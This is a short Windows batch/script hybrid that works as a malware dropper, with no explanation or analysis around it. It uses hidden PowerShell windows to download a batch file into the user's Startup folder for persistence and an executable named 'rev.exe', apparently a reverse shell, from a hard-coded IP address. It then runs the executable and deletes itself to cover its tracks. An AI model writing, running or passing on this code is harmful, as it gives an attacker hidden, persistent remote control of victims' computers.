@if (@CodeSection == @Batch) @then

@echo off

del Starter.bat
set "currentd=%cd%"
cd "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

powershell -windowstyle hidden curl -o startup.bat http://34.88.221.44:9000/startup.bat
cd %currentd%
powershell -windowstyle hidden curl -o rev.exe http://34.88.221.44:9000/rev.exe

goto :Main

@end

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c ""%~f0""", 0, False
WScript.Quit

:Main
rev.exe
del "%~f0"
exit /b
